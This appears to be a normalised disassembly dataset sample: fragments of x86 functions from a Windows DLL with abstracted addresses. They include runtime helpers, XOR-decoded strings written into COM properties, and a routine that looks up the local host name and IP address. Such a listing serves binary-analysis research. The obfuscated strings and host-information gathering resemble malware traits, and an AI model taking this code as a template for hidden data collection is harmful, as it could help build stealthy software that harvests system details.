push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1008239b
mov eax [ ebp + 0xc ]
push r--data
call sub_10048300
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10001e8b
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10082369
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10001e8b
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_10057f0f
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_100427ff
mov eax esi
jmp r-xdata
sub_10057f6e
push 0x10
push r--data
call sub_1007fb20
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_100427ff
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb65
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10013b34
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_1001df5b
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1005803a
mov eax [ ebp - 0x1c ]
sub_10058050
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx [ rw-data ]
fld [ r--data ]
fsubr st1
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fldz
fstp [ ecx + 0xf8 ]
pop ebp
retn 0x4
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
fstp [ ecx + 0xf8 ]
pop ebp
retn 0x4
fxch st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld1
fstp [ ecx + 0xf8 ]
pop ebp
retn 0x4
pop ebp
retn 0x4
fld [ r--data ]
fstp [ ecx + 0xf8 ]
sub_10058130
push ebp
mov ebp esp
sub esp 0x1f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx 0x3
mov [ ebp - 0x1f8 ] eax
xor eax eax
mov ebx edx
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
mov [ ebp - 0x1c8 ] edi
mov [ ebp - 0x1d0 ] ebx
mov [ ebp - 0x1e8 ] eax
mov [ ebp - 0x1f4 ] eax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff8f
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x4
jb r-xdata
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0x1e8 ]
push edx
mov edx [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0x28 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0x1e8 ]
jns r-xdata
lea edx [ ebp - 0x1c4 ]
mov [ ebp - 0x1c4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0xd1
call sub_10053240
mov esi [ ebx ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x1c0 ]
mov eax 0xe
jmp r-xdata
lea edx [ ebp - 0x1c0 ]
mov eax 0xf2
call sub_10053240
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebx + 0x4 ]
lea eax [ ebp - 0x1f0 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1f0 ] 0x0
call [ VarBstrFromUI4@IAT ]
lea edx [ ebp - 0x1ac ]
mov eax 0x12c
call sub_10053240
mov esi [ ebp - 0x1f0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xb3
jmp r-xdata
call sub_10053240
mov edx [ ebp - 0x1f0 ]
push edx
call [ SysFreeString@IAT ]
mov ecx [ ebx + 0x20 ]
lea eax [ ebp - 0x1ec ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1ec ] 0x0
call [ VarBstrFromUI4@IAT ]
lea edx [ ebp - 0x120 ]
mov eax 0xee
call sub_10053240
mov esi [ ebp - 0x1ec ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038760
test eax eax
je r-xdata
mov ecx [ ebp - 0x1f0 ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1e8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x1c4 ] 0x0
mov edx [ ebp - 0x1ec ]
push edx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0xd0 ]
mov eax 0x52
call sub_10053240
mov esi [ ebx + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10038760
test eax eax
je r-xdata
mov ecx [ ebp - 0x1ec ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0x18
call sub_10053240
mov esi [ ebx + 0xc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x79
jmp r-xdata
mov ecx [ ebx + 0x10 ]
mov [ ebp - 0x1cc ] ecx
call sub_10021d40
mov ebx eax
lea ecx [ ebx + ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x1cc ]
mov esi eax
mov edi esi
call sub_10019130
lea edx [ ebp - 0xbc ]
mov eax 0x55
call sub_10053240
mov edi [ ebp - 0x1c8 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x3d
call sub_10053240
test esi esi
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xf4
call sub_10053240
lea edx [ ebp - 0xe4 ]
mov eax 0x31
call sub_10053240
mov ebx [ ebp - 0x1d0 ]
mov esi [ ebx + 0x14 ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push edi
call sub_10038760
test eax eax
je r-xdata
push esi
call [ LocalFree@IAT ]
lea edx [ ebp - 0x90 ]
mov eax 0x1a
call sub_10053240
mov esi [ ebx + 0x18 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x9a
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xe2
call sub_10053240
mov esi [ ebx + 0x1c ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x15
call sub_10053240
mov edx [ ebx + 0x2c ]
lea ecx [ ebp - 0x1d4 ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0x1d4 ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0x1d4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x48
jmp r-xdata
lea edx [ ebp - 0x15c ]
mov eax 0x96
call sub_10053240
mov esi [ ebp - 0x1d4 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d4 ] eax
mov edx [ ebp - 0x1d4 ]
mov edi [ SysFreeString@IAT ]
push edx
call edi
mov ecx [ ebx + 0x28 ]
lea eax [ ebp - 0x1dc ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1dc ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0x1dc ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x12f
call sub_10053240
lea edx [ ebp - 0x148 ]
mov eax 0x70
call sub_10053240
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1dc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038760
mov edx [ ebp - 0x1dc ]
push edx
call edi
mov ecx [ ebx + 0x24 ]
lea eax [ ebp - 0x1d8 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1d8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1d8 ] 0x0
jne r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1dc ] eax
lea edx [ ebp - 0x18c ]
mov eax 0x5f
call sub_10053240
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1d8 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d8 ] eax
mov edx [ ebp - 0x1d8 ]
push edx
call edi
cmp [ ebx + 0x38 ] 0x1
jne r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x2e
call sub_10053240
mov edx [ ebp - 0x1e8 ]
mov ecx [ ebp - 0x1c8 ]
call sub_1002dc50
test eax eax
je r-xdata
lea eax [ ebp - 0x1e4 ]
push eax
push 0x0
push 0x80000000
push 0x1
mov [ ebp - 0x1e4 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1e4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x1f4 ]
push edx
mov edx [ ebp - 0x1e8 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x1f4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x63
call sub_10053240
lea edx [ ebp - 0xf8 ]
mov eax 0x8b
call sub_10053240
mov eax [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1e4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push eax
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1e4 ] eax
lea edx [ ebp - 0x74 ]
mov eax 0x5
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x1f4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1e4 ]
push ecx
call edi
mov eax [ ebx + 0x44 ]
mov ecx [ ebx + 0x40 ]
lea edx [ ebp - 0x1e0 ]
push edx
push 0x0
push 0x80000000
push eax
push ecx
mov [ ebp - 0x1e0 ] 0x0
call [ VarBstrFromUI8@IAT ]
cmp [ ebp - 0x1e0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x128
call sub_10053240
lea edx [ ebp - 0x10c ]
mov eax 0x11
call sub_10053240
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1e0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1e0 ] eax
mov edx [ ebp - 0x1e0 ]
push edx
call edi
mov ecx [ ebx + 0x48 ]
lea eax [ ebp - 0x1d0 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1d0 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1d0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x19
call sub_10053240
lea edx [ ebp - 0x9c ]
mov eax 0x122
call sub_10053240
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1d0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d0 ] eax
mov edx [ ebp - 0x1d0 ]
push edx
call edi
mov ecx [ ebx + 0x4c ]
lea eax [ ebp - 0x1cc ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1cc ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1cc ] 0x0
jne r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x7b
call sub_10053240
lea edx [ ebp - 0x174 ]
mov eax 0xb0
call sub_10053240
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1cc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1cc ] eax
mov edx [ ebp - 0x1cc ]
push edx
call edi
lea edx [ ebp - 0x74 ]
mov eax 0x3a
call sub_10053240
sub_100588e2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
sar eax 0x1
sar esi 0x1
cmp esi eax
ja r-xdata
mov eax esi
pop esi
pop ebp
retn
lea ecx [ esi + esi ]
push ecx
push [ ebp + 0x10 ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_1005b1c7
add esp 0x10
sub_10058916
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
call sub_10062fa9
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
call sub_10008a22
jmp r-xdata
push 0x1
push [ ebp + 0xc ]
push edi
push edi
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_1006e5c0
add esp 0x24
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] eax
cmp eax ebx
jg r-xdata
cmp esi ebx
ja r-xdata
push 0x1
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_1006e5c0
add esp 0x24
mov [ ebp - 0x4 ] esi
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007f5d0
add esp 0xc
sub_100589c2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_100427ff
mov eax esi
jmp r-xdata
sub_10058a2f
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10067d3a
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_10067d3a
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_10058ae0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a0a1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x8c ] 0x7
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] cx
push edx
mov [ ebp - 0x4 ] ecx
push eax
mov ecx rw-data
mov edi rw-data
call sub_1004dee0
test eax eax
je r-xdata
push rw-data
call sub_1005ca50
mov esi eax
test esi esi
je r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
lea edx [ ebp - 0x68 ]
mov eax 0x6c
call sub_10045930
lea eax [ ebp - 0xbc ]
push esi
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0x68 ]
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0x4
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
xor edx edx
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x84 ] dx
cmp [ ebp - 0xa8 ] esi
jb r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_100187af
add esp 0x4
sub_10058c10
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1004067e
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1003ca39
sub_10058c50
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_1001c957
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_100187af
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_10069747
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10058cd0
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
lea eax [ ebp - 0x230 ]
push eax
push 0x2
mov ebx ecx
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
push 0x80
lea ecx [ ebp - 0xa0 ]
push ecx
call [ gethostname@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa0 ]
push edx
call [ gethostbyname@IAT ]
mov esi eax
test esi esi
jne r-xdata
call [ WSACleanup@IAT ]
mov eax 0x2
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x1c ]
mov eax 0x14
call sub_10049e00
mov eax [ esi + 0xc ]
mov eax [ eax ]
movzx ecx [ eax + 0x3 ]
movzx edx [ eax + 0x2 ]
push ecx
movzx ecx [ eax + 0x1 ]
push edx
movzx edx [ eax ]
push ecx
push edx
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x10
call sub_1002cb70
add esp 0x14
call [ WSACleanup@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
call [ WSACleanup@IAT ]
lea eax [ esi + 0x3 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10058dba
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
movzx edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
call [ eax + 0xc ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
jmp r-xdata
test eax eax
jle r-xdata
pop ebp
retn 0x4
sub_10058e00
push ebp
mov ebp esp
push 0xffffffff
push sub_10087c88
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test cl 0x2
jne r-xdata
test cl 0x4
jne r-xdata
mov edx [ eax + 0x24 ]
cmp [ edx ] edi
je r-xdata
mov ebx 0x7
xor eax eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] ax
mov [ ebp - 0x4 ] 0x2
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
lea edx [ ebp - 0x48 ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_100649e0
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov ecx [ eax + 0x20 ]
cmp [ ecx ] edi
je r-xdata
mov edx [ edx ]
mov ecx [ eax + 0x3c ]
cmp ecx edx
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x48 ]
push eax
mov ecx [ ecx ]
mov edx [ eax + 0x30 ]
mov edx [ edx ]
lea ecx [ ecx + edx * 2 ]
mov edx [ eax + 0x10 ]
mov eax [ edx ]
sub ecx eax
sar ecx 0x1
push ecx
xor edx edx
mov ebx 0x7
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
sar ecx 0x1
push ecx
xor edx edx
mov ebx 0x7
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_1005ddc0
mov [ ebp - 0x4 ] edi
mov ecx edx
lea ecx [ ebp - 0x2c ]
xor eax eax
push ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov ecx esi
mov [ esi ] ax
call sub_100649e0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
jmp r-xdata
call sub_100187af
add esp 0x4
sub_10058f40
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10058f90
push ebp
mov ebp esp
push 0xffffffff
push sub_100879d6
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] rw-data
mov [ rw-data ] r--data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ ebp - 0x4 ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
push eax
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
mov [ rw-data ] eax
call sub_1005ddc0
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10059063
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
